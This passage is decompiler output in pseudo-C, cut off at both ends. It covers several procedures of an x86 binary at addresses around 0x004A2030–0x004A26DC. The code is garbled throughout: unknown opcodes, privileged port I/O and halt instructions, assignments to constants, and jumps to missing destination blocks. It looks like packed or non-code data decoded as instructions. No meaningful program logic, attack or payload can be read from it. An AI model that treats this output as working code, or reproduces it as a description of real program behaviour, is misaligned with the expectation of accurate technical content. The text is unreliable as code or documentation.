    004a1f48: (fsave)((frestore)) + *(ebx + 48);
    004a1f4b: asm("lds edi,[esi]");
    004a1f4d: cl = 36;
    004a1f4f: al = al & 142;
    004a1f51: asm("sbb ebx,[eax+0x2cb7e0f5]");
    004a1f57: edi = edi + 1;
    004a1f58: asm("bound eax,[0x4e68ca61]");
    004a1f5e: esp = -1735763572;
    004a1f63: asm("aam 0x68");
    004a1f65: al :: 232;
    004a1f67: al = *LE8B6A8F9;
    004a1f6c: asm("clc");
    004a1f6f: *(eax + 1224682154) = *(eax + 1224682154) ^ 124;
    004a1f75: (restore)es;
    004a1f76: asm("jpe 0x4a1f07");
    004a1f78: asm("sbb al,0x8f");
    004a1f7a: (save)cs;
    004a1f7b: eax = eax & 1545335555;
    004a1f80: edx = edx & *(eax + 117);
    004a1f83: asm("sbb ebx,esi");
    004a1f85: *edi = eax;
    004a1f86: asm("enter 0xc570,0x17");
    004a1f8a: asm("Unknown opcode 0xc6");
    004a1f8b: asm("adc ebx,[edi+0x77]");
    004a1f93: ch = 48;
    004a1f95: 136335368;
    004a1f9a: while(edi = edi + 4) {
    }
    004a1f9c: (save)49;
    004a1f9e: asm("cmpsb");
    004a1f9f: eax :: esp;
    004a1fa1: esp = 1297935420;
    004a1fa6: *L97C2DAD7 = al;
    004a1fab: asm("xchg eax,edi");
    004a1fac: asm("adc al,[edx+ecx*2+0x1]");
    004a1fb0: edx = ss;
    004a1fb2: (save)esp;
    004a1fb3: esp = esp - 1;
    004a1fb4: asm("rcl byte [ebp+0x4a02438a],cl");
    004a1fba: asm("out dx,eax");
    004a1fbb: (restore)esi;
    004a1fbc: asm("in al,dx");
    004a1fbd: asm("in eax,0x4d");
    004a1fbf: asm("cld");
    004a1fc0: asm("Unknown opcode 0xdf");
    004a1fc1: asm("fyl2xp1");
    004a1fc3: asm("adc al,0xc4");
    004a1fc5: eax = eax - 1;
    004a1fc6: asm("xchg al,[eax+eax*2]");
    004a1fca: if(!(ebp = ebp + 1)) {
        004a1fcc: esi = esi - 1;
        004a1fcd: asm("Unknown opcode 0x8e");
        004a1fce: ebx = ebx - 1;
        004a1fcf: asm("int 0xe1");
        004a1fd1: cl = 89;
        004a1fd8: *L30F2AEE8 = eax;
        004a1fdd: asm("loopne 0x4a202d");
        004a1fdf: asm("frstor [%gs:eax+0xdf0f79f6]");
        004a1fe6: if(eax & 189252259) {
            ff100039: goto L004a2018;
        }
        004a1fe8: >= ? 0x4a1ff0 : ;
        004a1fea: edi = edi - 1;
        004a1feb: al = al | dl;
004a1fed: L004a1fed:
        004a1fed: *(eax + 1017802456) & 1925814163;
        004a1ff7: asm("outsd");
        004a1ff8: ah = *(eax + -1057634153);
        004a1ffe: (save)esp;
        004a1fff: cl = 57;
        004a2001: asm("fnstcw [esi+ebp*4]");
        004a2004: (save)-54;
        004a2006: *esi = *esi & eax;
        004a2008: asm("Unknown opcode 0xd3");
        004a2009: asm("cmc");
        004a200a: asm("adc eax,0xb8027df1");
        004a2010: L03976c72();
    }
    004a2015: *L43BE73DC = al;
004a2018: L004a2018:
    004a201a: *eax = *eax << 1;
    004a201c: asm("rcr byte [eax+0x9ffc4c6e],0x28");
    004a2023: asm("xchg eax,esi");
    004a2024: asm("loop 0x4a201d");
    004a2026: asm("%g inc ebp");
    004a2028: if(esp = esp - 1) {
        ff10003b: goto L004a1fed;
    }
    004a202a: asm("cwde");
    004a202b: asm("loopne 0x4a20a0");
    004a202d: esi = esi & ebx;
    004a202f: asm("retf");
}

/* DEST BLOCK NOT FOUND: 004a221c -> e589bb11 */
/*	Procedure: 0x004A2030 - 0x004A2319
 *	Argument size: 4610
 *	Local size: 0
 *	Save regs size: 0
 */

L004A2030()
{



    004a2030: >= ? 0x4a206c : ;
    004a2032: asm("adc [ebx],esi");
    004a2034: asm("aaa");
    004a2035: asm("in eax,0x8f");
    004a2037: asm("jpo 0x4a2033");
    004a2039: al = al | 54;
    004a203b: asm("adc eax,0x6f2ef199");
    004a2040: esp = esp - 1;
    004a2041: asm("out dx,eax");
    004a2042: *(ecx + 724257531) = *(ecx + 724257531) + al;
    004a2048: al = al & *(esi + edi * 2 + -1614410266);
    004a204f: asm("adc cl,[ebx+0x1f]");
    004a2052: asm("xchg ax,[0x6f4e0fef]");
    004a2059: asm("Unknown opcode 0xc7");
    004a205a: esp = ebp;
    004a205a: (restore)ebp;
    004a205b: (restore)edi;
    004a205c: (fsave)((frestore)) * *(ecx - 109);
    004a205f: *(eax + 1489225980) & edi;
    004a2065: ecx = ecx - 1;
    004a2066: ch = 200;
    004a2068: asm("adc eax,0x17c1d077");
    004a206e: bh = bh ^ *(ebp + -1248681471);
    004a2074: eax = eax + -486848679;
    004a2079: asm("adc eax,0x7f112f5f");
    004a207e: asm("aad 0x46");
    004a2080: ebx = -374925608;
    004a2085: asm("adc eax,0xdbc7c8bc");
    004a208a: edi :: esp;
    004a208c: *(edi + 1068227088) = *(edi + 1068227088) - al;
    004a2092: asm("cmc");
    004a2093: asm("in al,0xbe");
    004a2095: asm("clc");
    004a2097: if(!(edx = edx - 1)) {
        004a2099: ebx = -859862882;
        004a209e: asm("Unknown opcode 0xff");
        004a209f: > ? L004a211d : ;
        004a20a1: dl = 29;
        004a20a3: asm("fnstsw [esi]");
        004a20a5: ah = 67;
        004a20a7: (restore)esi;
        004a20a8: asm("sbb al,0x63");
        004a20aa: edx = 1778853422;
        004a20af: asm("rcl byte [ebx],1");
        004a20b1: asm("outsd");
        004a20b2: asm("pushf");
        004a20b3: goto L000082f4;
    }
    004a20ba: al = al - 213;
    004a20c1: asm("xchg edx,esp");
    004a20c3: if(eax >= 530117295) {
        004a20c5: asm("sbb al,0xa5");
        004a20c7: goto L000090c9;
        004a20ce: *edx :: edi;
        004a20d5: return(eax & 488654350);
        004a20d6: (restore)ds;
        004a20d7: *edi = *esi;
        004a20d7: edi = edi + 4;
        004a20d7: esi = esi + 4;
        004a20d8: *esi = *esi - cl;
    }
    004a20da: *edi :: 108;
    004a20dd: ch = 43;
    004a20df: al = al | 106;
    004a20e1: bl = bl | dh;
    004a20e3: esi = esi + 1;
    004a20e4: asm("Unknown opcode 0xde");
    004a20e5: asm("ror edx,cl");
    004a20e7: eax :: -1952466877;
    004a20ec: *edx = *edx - ebp;
    004a20ee: asm("hlt");
    004a20ef: asm("retf 0xba32");
    004a20f2: asm("Unknown opcode 0x0f");
    004a20f3: asm("jecxz 0x4a20a4");
    004a20f5: esi = esi - 1;
    004a20f6: *(edi + ebx - 90) = cs;
    004a20fa: asm("Unknown opcode 0xff");
    004a20fb: (fsave)((frestore)) + *eax;
    004a20fd: asm("Unknown opcode 0xc7");
    004a20fe: (restore)edx;
    004a20ff: *(ecx + 2104673934) = !( *(ecx + 2104673934));
    004a2105: asm("in eax,dx");
    004a2106: eax = eax + 1698907905;
    004a210b: *ebx = cs;
    004a210d: asm("insb");
    004a210e: asm("%f push ebx");
    004a2110: asm("cmpsb");
    004a2111: asm("repne add cl,ch");
    004a2114: eax = eax & 1254190347;
    004a2119: asm("cli");
    004a211a: al = al & 20;
    004a211c: asm("sbb eax,0x85b1c1d");
    004a2121: al = *esi;
    004a2122: asm("xchg esp,esi");
    004a2124: asm("cwde");
    004a2125: asm("%d retf 0xde60");
    004a2129: asm("xlatb");
    004a212a: eax = eax ^ 431821984;
    004a212f: if(!(esi = esi + 1)) {
    }
    004a2137: asm("in al,dx");
    004a2138: if(!( *(ebx + -1498500316) = *(ebx + -1498500316) | esp)) {
        004a213a: asm("xchg eax,ecx");
        004a213b: goto L5e0f82d1;
        004a2140: eax = *L5BD284F7;
    }
    004a2145: asm("a16 mov dl,0xf9");
    004a2148: asm("popa");
004a2149: L004a2149:
    004a2149: asm("Unknown opcode 0xc7");
    004a214a: asm("in al,dx");
    004a214b: (restore)edx;
    004a214c: *ebx = *ebx & bl;
    004a214e: asm("adc [ebp+0x4e87f7a6],dh");
    004a2154: asm("cmpsb");
    004a2155: (restore)edi;
    004a2156: *esi = ((frestore));
    004a2159: al = al - 184;
    004a215b: ecx = ecx + 1;
    004a215c: asm("popa");
    004a215d: ebx = ebx | *L0AB924AC;
    004a2163: eax = eax + 1632455081;
    004a2168: eax = L00009afd();
    004a216f: asm("lds ebx,[ebx+0xe1bdbcfb]");
    004a2176: ch = 217;
    004a2178: asm("adc dh,[edx+ecx]");
    004a217b: (restore)ss;
    004a217c: if(!(ecx = ecx + 1)) {
        004a217e: asm("fist dword [esi+0x96573994]");
    }
    004a2187: if(85 = *ecx * eax) {
        ff100047: goto L004a2149;
    }
004a2188: L004a2188:
    004a2189: asm("std");
    004a218a: asm("Unknown opcode 0x62");
    004a218b: *(edx - 14) = ((frestore));
    004a218e: (restore)ss;
    004a218f: (save)1905101492;
    004a2194: asm("scasd");
    004a2195: (fsave) *%cs:esi+0x529c73c8];
    004a21a3: bl = 251;
    004a21a5: if(*(eax + edx * 4 + -214441943) >= ecx) {
        ff100049: goto L004a2188;
    }
    004a21a7: ebx = -1540414788;
    004a21ac: asm("loope 0x4a2170");
    004a21ae: asm("Unknown opcode 0xc7");
    004a21af: asm("bound edx,[ecx+0x40514b42]");
    004a21b5: cl = 237;
    004a21b7: (restore)ebp;
    004a21b8: >= ? 0x4a2236 : ;
    004a21ba: asm("xchg eax,ecx");
    004a21bb: asm("aaa");
    004a21bc: ebx = ebx + 1;
    004a21bd: (save)eax;
    004a21be: asm("popa");
    004a21bf: eax = eax & *ecx;
    004a21c1: esp = esp & *(edi + 1070856477);
    004a21c7: eax = eax & -1974577910;
    004a21cd: asm("enter 0x898a,0x98");
    004a21d1: (save)ebx;
    004a21d2: asm("scasb");
    004a21d3: (restore)ds;
    004a21d4: bl = 0;
    004a21d6: asm("Unknown opcode 0x82");
    004a21d7: asm("Unknown opcode 0x8f");
    004a21d8: (save)764381797;
    004a21dd: (save)ebp;
    004a21de: asm("xchg eax,ebp");
    004a21df: eax = eax ^ -1776392058;
    004a21e4: asm("repne jecxz 0x4a2241");
    004a21e7: asm("into");
    004a21e8: (restore)ecx;
    004a21e9: al = *L0E31592E;
    004a21ee: asm("cwde");
    004a21ef: al & 98;
    004a21f2: *(edx - 98) = *(edx - 98) - edi + 1;
    004a21f5: asm("%e xchg eax,edx");
    004a21f7: asm("%s o16 lodsb");
004a21f8: L004a21f8:
    004a21fa: edi = -686177298;
    004a21ff: asm("xchg eax,edx");
    004a2200: (fsave) *eax;
    004a2202: (save)ds;
    004a2205: edx = ebx / ebx % ebx / ebx - 1;
    004a2206: *edi = *esi;
    004a2206: edi = edi + 1;
    004a2206: esi = esi + 1;
    004a2207: *(ecx + -7132478) = *(ecx + -7132478) | -1823660819;
    004a2211: *L8DBE4012 = *L8DBE4012 + -557222849;
    004a221b: asm("in al,dx");
    004a221c: goto Le589bb11;
    004a2221: asm("ror byte [0xeb0df510],0xa4");
    004a2228: asm("popf");
    004a2229: *edi = eax;
    004a2229: edi = edi + 4;
    004a222a: asm("outsd");
    004a222b: goto L004a227e;
    004a2231: asm("cmpsb");
    004a2232: edx = edx ^ *(edi + 15);
    004a2235: if(-25 = *(eax + 53) * edx) {
        ff10004b: goto L004a21f8;
    }
    004a2237: < ? L004a220e : ;
    004a2239: ebx = ebx - 1;
    004a223a: edx = edx + 1;
    004a223b: (restore)esp;
    004a223c: (save)ecx;
    004a223e: edi = ecx;
    004a223f: (restore)edx;
    004a2240: goto L00007b62;
    004a2247: ah = 197;
    004a2249: asm("hlt");
    004a224a: asm("adc [ebp-0x26],cl");
    004a224d: esi = esi - 1;
    004a224e: ch = 211;
    004a2250: asm("rcr byte [0x6e3e18b2],cl");
004a2255: L004a2255:
    004a2256: al = *esi;
    004a2256: esi = esi + 1;
    004a2257: asm("adc esp,[edi]");
    004a2259: asm("in al,dx");
    004a225a: (save)edx;
    004a225b: *edi = *esi;
    004a225b: edi = edi + 1;
    004a225b: esi = esi + 1;
    004a225c: return;
    004a225f: asm("fcom qword [edx]");
    004a2261: edi = edi - 1;
    004a2269: if(-28 = *(edi + -1912074244) * ebx) {
        ff10004d: goto L004a2255;
    }
    004a226b: asm("cdq");
    004a226c: >= ? 0x4a225e : ;
    004a226e: asm("a16 in al,0xde");
    004a2273: (restore)esi;
    004a2274: if(*eax < dh) {
        004a2276: esp = ebp;
        004a2276: (restore)ebp;
        004a2277: goto L0000619f;
    }
004a227e: L004a227e:
    004a227e: al = al & 239;
    004a2280: dh = 109;
    004a2282: asm("cld");
    004a2283: (save)es;
    004a2284: ebx = ebx - 1;
    004a2285: asm("xchg eax,ebx");
    004a2286: asm("%s cmp al,0x82");
    004a2289: asm("%c xlatb");
    004a228d: asm("jpo 0x4a2241");
    004a228f: asm("adc cl,[edi]");
    004a2291: asm("arpl [ebx-0x4e],di");
    004a2294: ebp = ebp ^ *(ebx + 1098098508);
    004a229a: asm("rol dword [esi-0x48],0x28");
    004a229e: ebx = ebx ^ *(ecx - 15);
    004a22a1: eax = eax ^ 1008432848;
004a22a6: L004a22a6:
    004a22a6: ecx = 889140125;
    004a22ab: asm("repne scasd");
    004a22ad: asm("adc [esi],edi");
    004a22b0: asm("rol dword [ebp+0xcfc2e5c],0x8");
    004a22b7: *L6C405979 = eax;
    004a22bc: asm("cld");
    004a22bd: *(ebx + 28) = ((frestore));
    004a22c0: if(edx = edx | esp) {
        ff100051: goto L004a22a6;
    }
    004a22c2: asm("in al,0xe6");
    004a22c4: asm("o16 mov bh,0xda");
    004a22c7: al = al | 77;
    004a22c9: (restore)ebx;
    004a22ca: edx = edx - 1;
    004a22cb: asm("popf");
    004a22cc: (save)-13;
    004a22ce: asm("Unknown opcode 0xd2");
    004a22cf: asm("repne outsd");
    004a22d1: esp = 198315688;
    004a22d6: esi = esi + 1;
    004a22d7: edi = edi + 1;
    004a22d9: asm("Unknown opcode 0x82");
    004a22da: esp = -1036279279;
    004a22df: asm("xchg eax,ebp");
    004a22e0: al = al & 30;
    004a22e2: cl = 94;
    004a22e4: asm("sbb bh,ah");
    004a22e6: asm("xchg eax,ebx");
    004a22e7: asm("out 0x13,al");
    004a22e9: asm("insb");
    004a22ea: asm("sbb eax,0x92fc1fde");
    004a22ef: *ecx = dh;
    004a22f1: *(edi - 20) & esi;
    004a22f4: asm("in al,dx");
    004a22f5: asm("sbb dword [ebx+0x4a],0x646d54d3");
004a22fb: L004a22fb:
    004a22fc: ch = cl;
    004a22fe: ebp = 1191735551;
    004a2303: ah = 238;
    004a2305: goto L004a22a6;
    004a2307: asm("xchg esp,[ecx+edi+0x6b]");
    004a230b: return;
    004a230e: asm("arpl dx,cx");
    004a2310: goto L004a22fb;
    004a2312: *(ebp + ebp * 2 + 422485763) :: ecx;
}

/*	Procedure: 0x004A231A - 0x004A2323
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004A231A()
{



    004a231a: asm("std");
    004a231b: ebx = ebx + 1;
    004a231c: cl = 195;
    004a2323: return(eax | -500319158);
}

/* DEST BLOCK NOT FOUND: 004a2326 -> 571e49e1 */
stack space not deallocated on return
/*	Procedure: 0x004A2324 - 0x004A254E
 *	Argument size: 22027
 *	Local size: 0
 *	Save regs size: 0
 */

L004A2324()
{



    004a2324: asm("daa");
    004a2325: asm("hlt");
    004a2326: goto L571e49e1;
    004a232b: asm("xchg eax,ebp");
    004a232c: >= ? 0x4a2378 : ;
    004a232e: (restore)esp;
    004a232f: asm("Unknown opcode 0x62");
    004a2330: (fsave)((frestore)) - *(esi + -657352548);
    004a2336: cl = cl & *(edi - 10);
    004a2339: (save)113;
    004a233b: (save)ebp;
    004a233c: asm("xchg eax,edx");
    004a233d: (restore)ebx;
    004a233e: al = al ^ 223;
004a233f: L004a233f:
    004a2340: *LC4DE3824 :: 2;
    004a2347: ecx = ecx - 1;
    004a2348: (save)cs;
    004a2349: edx = edx - 1;
    004a234a: ebx = ebx ^ edi;
    004a234c: edx = edx - *edx;
    004a234e: eax = eax | -693221806;
    004a2353: eax = eax & -1038247148;
    004a2358: asm("jpo 0x4a2350");
    004a235a: *LA3289851 = eax;
    004a235f: dh = dh | *(eax - 102);
    004a2362: asm("salc");
    004a2363: asm("jecxz 0x4a235f");
    004a2365: esi = esi ^ *(edi + 17);
    004a2368: asm("clc");
    004a2369: (save)ebp;
    004a236a: asm("int 0xa0");
004a236c: L004a236c:
    004a236c: (save)ss;
    004a236d: asm("xchg esi,[ebx-0x6]");
    004a2370: asm("loope 0x4a2382");
    004a2372: asm("lodsd");
    004a2379: asm("fsubr qword [edi+0x1fe379fd]");
004a237e: L004a237e:
    004a237f: asm("daa");
    004a2380: (save)edx;
    004a2381: if(*(esi + -360233409) = *(esi + -360233409) & dh) {
        ff100053: goto L004a233f;
    }
    004a2383: ch = 204;
    004a2385: (save)es;
    004a2386: esp = esp ^ esi;
    004a2388: asm("xchg eax,edi");
    004a2389: asm("int1");
    004a238a: eax = eax + 1958903889;
    004a238f: *L49B220B1 = eax;
    004a2394: asm("popa");
    004a2395: asm("aas");
    004a2396: asm("adc [edx],bl");
    004a2398: asm("aad 0xcc");
    004a239a: asm("cmpsb");
    004a239b: asm("Unknown opcode 0xd9");
    004a23a0: asm("loop 0x4a2402");
    004a23a2: asm("loope 0x4a2409");
    004a23a4: asm("in al,dx");
    004a23a5: if(!(al = (al | 42) - 171)) {
        004a23a7: asm("xchg eax,ebx");
        004a23a8: asm("%e mov esp,0x2c04f155");
    }
    004a23ae: asm("xlatb");
    004a23af: > ? L004a23db : ;
    004a23b1: (fsave)((frestore)) * *(ecx + 1806627901);
004a23b3: L004a23b3:
    004a23b7: esi = esi - *esi;
    004a23b9: *edi = al;
    004a23ba: if(!(edi = edi + 1)) {
        004a23bc: < ? L004a23b8 : ;
        004a23be: edi = 827260567;
        004a23c3: asm("adc eax,0xc3d3e6fc");
        004a23c8: dh = 172;
        004a23ca: *edi = *esi;
        004a23ca: edi = edi + 4;
        004a23ca: esi = esi + 4;
        004a23cb: eax = *LAFA7BC50;
        004a23d0: asm("out 0xd8,al");
        004a23d2: asm("fldln2");
        004a23d4: eax = eax + 1;
        004a23d7: (restore)ebx;
        004a23d8: if(*ebx = *ebx + bh) {
            ff100059: goto L004a237e;
        }
        004a23da: asm("int 0xf9");
        004a23dc: *(edx - 113) = *(edx - 113) - bl;
        004a23df: asm("Unknown opcode 0xc7");
        004a23e0: al = al | 96;
004a23e2: L004a23e2:
        004a23e8: if(ebp = ebp + -207403496) {
            ff10005b: goto L004a236c;
        }
        004a23ea: asm("cmc");
        004a23eb: (save)ecx;
        004a23ec: al = 18;
        004a23ee: > ? L004a23cf : ;
        004a23f0: edx = edx - 1;
        004a23f6: ecx = ecx | *(ebx + -1457683442);
        004a23fc: -2046128088;
        004a2401: asm("salc");
        004a2402: eax = L4e7a3a04();
    }
    004a2407: asm("outsd");
    004a2408: asm("xchg eax,ebx");
    004a2409: edx = 1950421476;
    004a240e: *edi = al;
    004a240f: asm("jecxz 0x4a2462");
    004a2411: if(edi = edi + 1) {
        ff10005d: goto L004a23b3;
    }
    004a2413: asm("in eax,0x11");
    004a2415: (restore)eax;
    004a2416: asm("Unknown opcode 0xc6");
    004a2417: (restore)ss;
    004a2419: asm("loop 0x4a2437");
    004a241b: if(ecx = ecx + 1) {
        ff10005f: goto L004a23e2;
    }
    004a241d: asm("sbb al,0xa2");
    004a2422: (restore)eax;
    004a2423: asm("int 0x51");
    004a2425: *esi = ((frestore));
    004a2427: edi = -514534135;
    004a242c: if(!(esi = esi | *(edi - 26))) {
        004a242e: eax = L000081b5();
        004a2435: (restore)ss;
        004a2436: dh = 103;
        004a2438: asm("ror ebp,cl");
        004a243a: *(ecx - 5) = cs;
        004a243d: asm("rcl dword [edx+0xc8e9815b],cl");
        004a2443: asm("popf");
        004a2444: asm("jecxz 0x4a2495");
        004a2446: asm("%c cmovpo eax,ebp");
        004a244a: asm("les esi,[ecx+0x838a8bd3]");
        004a2450: asm("sbb esp,[ecx-0x80]");
    }
    004a2453: *(ecx - 122) & esi;
    004a2456: asm("cmpsb");
    004a2457: bh = 207;
    004a2459: asm("std");
004a245a: L004a245a:
    004a245a: asm("cld");
    004a245b: asm("sbb [ecx],eax");
    004a245d: ebx = ebx + 1;
    004a245e: asm("Unknown opcode 0x82");
    004a245f: *edi = eax;
    004a245f: edi = edi + 4;
    004a2460: (save)ecx;
    004a2461: asm("sbb [eax],edi");
    004a2463: asm("insd");
    004a2464: asm("std");
    004a2465: *esi();
    004a2467: (restore)edi;
    004a2468: *L358134EA = eax;
    004a246d: bh :: *(edx - 45);
    004a2470: asm("das");
    004a2471: asm("Unknown opcode 0x8e");
    004a2472: asm("lock push ebp");
    004a2474: bl = 40;
    004a2476: asm("xchg eax,esi");
    004a2477: asm("xchg esi,[edx-0xe]");
    004a247a: asm("insb");
    004a247b: -1787071764 = *edx * ebx;
    004a2481: asm("xchg ecx,[edx+0xb4a59b10]");
    004a2487: esi = esi + 1;
    004a2488: asm("salc");
    004a2489: asm("rep push cs");
    004a248b: al = *esi;
    004a248c: if(!(esi = esi + 1)) {
        004a248e: asm("cwde");
        004a2490: if(!(edx = edx + 1)) {
            004a2492: (save)edx;
            004a2493: bl = bl | cl;
            004a2495: asm("std");
            004a2496: al :: 254;
            004a2498: return;
            004a249b: al = al & 229;
            004a249d: ecx = ecx - 1;
            004a249e: al = *L1AB75F7A;
            004a24a3: dh = dh + bh;
            004a24a5: (save)ebp;
            004a24a6: asm("les esi,[esi+0x9c9e23af]");
            004a24ac: fs = *ecx;
            004a24ae: al & 178;
            004a24b0: esp = 301523535;
        }
        004a24b5: asm("lodsd");
        004a24b6: esp = esp - 1;
        004a24b7: asm("out dx,al");
        004a24b8: asm("les ebp,[eax-0x57]");
        004a24bb: asm("xlatb");
        004a24bc: (save)cs;
        004a24bd: asm("retf 0x4482");
        004a24c1: eax = esi;
004a24c2: L004a24c2:
        004a24c3: if(ebx = ebx + 1) {
            ff100067: goto L004a245a;
        }
        004a24c5: (restore)es;
        004a24c6: *L47210BD5 = eax;
        004a24cb: asm("bound ebx,[ecx+0xdaa2f9b7]");
        004a24d1: al = al - 55;
        004a24d6: if(dl < *(edx + 111)) {
            ff100069: goto L004a2512;
        }
        004a24d8: asm("loadall");
        004a24da: <= ? L004a2460 : ;
        004a24dc: ebp = ebp + *(ebx + 1922217619);
        004a24e2: edx = edx - 1;
        004a24e3: asm("pusha");
        004a24e4: asm("in al,0xb4");
        004a24e6: *LD7D73F73 = eax;
        004a24eb: asm("lahf");
        004a24ec: (save)esi;
        004a24ed: return;
        004a24f2: ebx = *(eax - 26) & 255;
        004a24fa: if(eax = eax | -27284696) {
            ff10006b: goto L004a250d;
        }
        004a24fc: *L862FBC30 = eax;
    }
    004a2501: edi = edi + 1;
    004a2502: al = al + 82;
    004a2504: es = *(esp + ecx);
    004a2507: asm("sbb al,0x28");
    004a2509: asm("sbb cl,dh");
    004a250b: asm("ror ebp,0xd7");
004a250d: L004a250d:
    004a250e: dh = 128;
    004a2510: asm("outsd");
    004a2511: asm("%f sub eax,0x89aec51c");
004a2512: L004a2512:
    004a2517: *edx = *edx ^ ah;
    004a2519: asm("lahf");
    004a251a: asm("cwde");
    004a251b: (save)1369292857;
    004a2520: *(ecx + 1186798920) = *(ecx + 1186798920) << cl;
    004a2526: asm("out 0xb9,al");
    004a2528: (restore)esi;
    004a2529: asm("Unknown opcode 0xc7");
    004a2530: asm("lahf");
    004a2531: ebx = ebx ^ *(esi + 1223783656);
    004a2537: asm("ror byte [ecx+0xa558dced],0x5");
    004a253e: if(*(edx + 258925911) = *(edx + 258925911) - ah) {
        ff10006d: goto L004a24c2;
    }
    004a2540: asm("sbb ecx,[edi-0x4e]");
    004a2543: asm("Unknown opcode 0x8e");
    004a2544: < ? L004a254b : ;
    004a2546: asm("xchg bh,dl");
    004a2548: esi = esi - *(esi - 105);
    004a254b: asm("xlatb");
}

/* DEST BLOCK NOT FOUND: 004a2606 -> e5b5419f */
/*	Procedure: 0x004A254F - 0x004A26B4
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004A254F()
{



    004a254f: 587475208 = *(ebx + -946352949) * ebp;
    004a2559: (save)edx;
    004a255b: if(!(ebx = ebx - 1)) {
        004a255d: eax = eax - 503519788;
        004a2562: asm("loop 0x4a2543");
        004a2569: ah = 2031718613 + bh;
        004a256b: asm("xchg eax,esi");
        004a256c: asm("xchg eax,ecx");
        004a256d: esp = esp + 1;
        004a256e: asm("adc esp,ecx");
        004a2575: eax :: -42606393;
        004a257a: gs = *LF0E7376F;
        004a257c: (fsave)((frestore)) / *(ebp + ebp - 116);
        004a2580: *(esi + -1524053418) = *(esi + -1524053418) & ah;
004a2582: L004a2582:
        004a2586: asm("sbb ebp,[ecx+0x1337d269]");
        004a258c: al = al ^ 35;
        004a2592: asm("in eax,0xca");
        004a2594: ecx = -1775433317;
        004a2599: if(*%ss:esi] = *%ss:esi] & dl) {
            ff100071: goto L004a2582;
        }
        004a259b: ah = 111;
        004a259d: *L962D099B = *L962D099B & dh;
        004a259f: asm("rcr byte [edx+0x6bb51e48],1");
        004a25a5: *(ecx + 1421310469) = *(ecx + 1421310469) & esi;
        004a25ab: (save)ss;
        004a25ac: *LF575CA71 = al;
        004a25b1: asm("sahf");
    }
    004a25b2: dl = dl + *(edi + -1321355717);
    004a25b8: *(edi + 901385083) = *(edi + 901385083) + ebp;
    004a25be: cl = *(esp + edi * 2);
    004a25c1: asm("out 0x20,eax");
    004a25c3: asm("xchg eax,ebx");
    004a25c4: asm("xlatb");
    004a25c5: al :: 100;
    004a25c7: asm("rep add eax,0x7ed864a");
    004a25cd: ecx = ecx + 1;
    004a25cf: asm("adc byte [eax+0xbc0df162],0xa1");
    004a25d6: asm("Unknown opcode 0xdb");
    004a25d7: asm("stc");
    004a25d8: *edi = *edi + edi;
    004a25da: asm("daa");
    004a25db: (save)91;
    004a25dd: ecx = ecx + 1;
    004a25de: asm("outsd");
    004a25df: asm("pusha");
    004a25e0: asm("sbb [edx],bl");
    004a25e2: (restore)ss;
    004a25e3: al = al & 94;
    004a25e5: esp = esp ^ *LDDF31017;
    004a25eb: asm("xchg eax,edx");
    004a25ec: *(esi + ecx) = ~( *(esi + ecx));
    004a25ef: al = al ^ 242;
    004a25f1: asm("pushf");
    004a25f3: if(!(edx = edx + 1)) {
        004a25f5: dl = bh;
        004a25f7: (restore)ecx;
        004a25f8: Le5b5419f();
        004a25fd: asm("adc eax,0xc94fac3f");
004a2601: L004a2601:
        004a2602: *eax :: -79;
        004a2605: (save)ebp;
        004a2606: goto L0000d402;
        004a260d: 2085635186 = edx * esi;
        004a2613: (save)edx;
        004a2614: (save)ebx;
004a261a: L004a261a:
        004a261b: asm("out 0x54,eax");
        004a261d: ecx = ecx ^ *esi;
        004a261f: asm("in al,dx");
        004a2620: asm("fisubr word [edi+0xa2f63e50]");
        004a2626: if(eax < *LC6E9F530) {
            004a2628: asm("ror byte [ecx+0x3aa2f77b],0xe6");
            004a262f: asm("lock add edx,ecx");
            004a2632: >= ? L004a2600 : ;
            004a2634: asm("lahf");
            004a2635: edi :: *(esi + -213788658);
            004a263b: edi = edi - 1;
            004a263c: asm("cli");
        }
    }
    004a263e: ebx = -498975297;
    004a2644: if(edx = edx + 1) {
        ff100077: goto L004a261a;
    }
    004a2646: asm("cmpsb");
    004a2647: ecx = ecx - 1;
    004a2648: ecx = -1814090004;
    004a264d: edx = edx - 1;
    004a264e: al = al + 193;
    004a2650: *(edx + -1814090049) = *(edx + -1814090049) + 356544159;
    004a2658: asm("in eax,dx");
    004a2659: asm("enter 0x87a6,0x6b");
    004a265d: (save)edx;
    004a265e: al :: 41;
    004a2660: asm("sbb [edx+eax],ecx");
    004a2663: asm("sti");
    004a2664: edx = esi / esi % esi / esi;
    004a2666: asm("clc");
    004a2667: asm("std");
    004a266d: (restore)edx;
    004a266e: if(eax = eax + 1127161360) {
        ff100079: goto L004a2601;
    }
    004a2670: cl = 212;
    004a2672: asm("cli");
    004a2676: al = 229;
    004a2678: asm("sbb eax,0x1bd79658");
    004a267d: asm("bound ebp,[ecx+edi*8+0x4bf29c49]");
004a2680: L004a2680:
    004a2684: asm("cmpsd");
    004a2685: (save)es;
    004a2686: (save)245380557;
    004a268b: if(ecx = ecx & *(edi + 126)) {
        ff10007b: goto L004a2680;
    }
    004a268d: (save)-28;
    004a268f: asm("popa");
    004a2690: asm("loope 0x4a26f6");
    004a2692: goto L00001108;
    004a2699: asm("sbb eax,0x6b533e2c");
    004a269e: asm("xchg ah,[ebp+eax*8+0x673a10e9]");
    004a26a5: asm("xchg eax,edi");
    004a26a6: asm("retf 0x3900");
    004a26a9: != ? 0x4a265f : ;
    004a26ab: *ebx = *ebx / *ebx;
    004a26ab: edx = *ebx % *ebx;
    004a26ad: esi = esi | 28;
    004a26b0: asm("insd");
    004a26b1: asm("rcr dword [eax],0x72");
    004a26b4: asm("iret");
}

stack space not deallocated on return
/*	Procedure: 0x004A26B5 - 0x004A29C3
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004A26B5()
{



    004a26b5: asm("das");
    004a26b6: asm("xchg eax,edx");
    004a26b7: asm("clc");
    004a26b8: asm("popa");
    004a26b9: asm("int 0x3c");
    004a26bb: asm("scasb");
    004a26bc: ebx = ebx & *(ebx + -1726639082);
    004a26c2: *(edx + -262486217) = *(edx + -262486217) & ch;
    004a26c8: *LB30B66C4 = esp;
    004a26ce: (restore)esi;
    004a26d1: if(!(al = al | 189)) {
        004a26d3: asm("loop 0x4a2674");
004a26d4: L004a26d4:
        004a26d5: (restore)edi;
        004a26d6: ch = ch & al;
        004a26d8: cl = 125;
        004a26da: esp = esp - 1;
        004a26db: (save)ds;
        004a26dc: asm("rep retf");
